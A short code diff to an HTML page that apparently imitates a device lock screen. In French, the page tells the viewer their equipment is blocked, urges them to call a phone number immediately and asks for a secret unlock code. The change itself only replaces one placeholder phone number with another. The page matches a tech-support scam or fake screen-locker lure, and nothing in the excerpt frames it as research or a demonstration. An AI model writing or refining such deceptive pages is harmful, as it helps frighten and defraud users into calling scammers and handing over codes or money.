@@ -58,7 +58,7 @@
 
     <div class="container">
         <p class="message">⚠️ Votre équipement est bloqué ⚠️<br>Appelez immédiatement :</p>
-        <p style="color: red; font-size: 4vw; font-weight: bold;">+33 6 XX XX XX XX</p>
+        <p style="color: red; font-size: 4vw; font-weight: bold;">+33 6 00000000</p>
         <p style="font-size: 3vw;">Entrez le code de déverrouillage :</p>
         <input type="password" id="codeInput" placeholder="Code secret">
         <p id="error-message"></p>
